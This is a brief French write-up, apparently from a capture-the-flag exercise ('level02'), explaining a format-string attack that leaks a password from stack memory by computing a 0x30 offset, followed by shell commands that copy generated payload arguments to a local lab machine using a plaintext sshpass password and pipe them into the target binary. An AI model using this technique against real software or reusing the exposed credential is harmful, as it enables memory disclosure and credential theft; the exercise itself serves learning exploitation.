En affichant sur la sortie la mémoire, le 1er argument "7fffffffe500" correspond au mot de passe.
Il est normalement stocké à l'adresse "7fffffffe4d0".
On devine que lors du printf 7fffffffe500 - 7fffffffe4d0 octets ont été push sur la stack soit 30 (hex) = 48 octets.

L'adresse du mot de passe est 7fffffffe540, en lui ajoutant 30(hex) on trouve l'adresse 0x7fffffffe570.

En l'écrivant dans le 2e argument et en affichant le 8e element on obtient le mot de passe.

```bash
make && ./generator  && sshpass -p 'PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv' scp -P 4242 -r args level02@localhost:/tmp/
```

```bash
(cat /tmp/args/arg1 ; cat /tmp/args/arg2 ) | ./level02
```
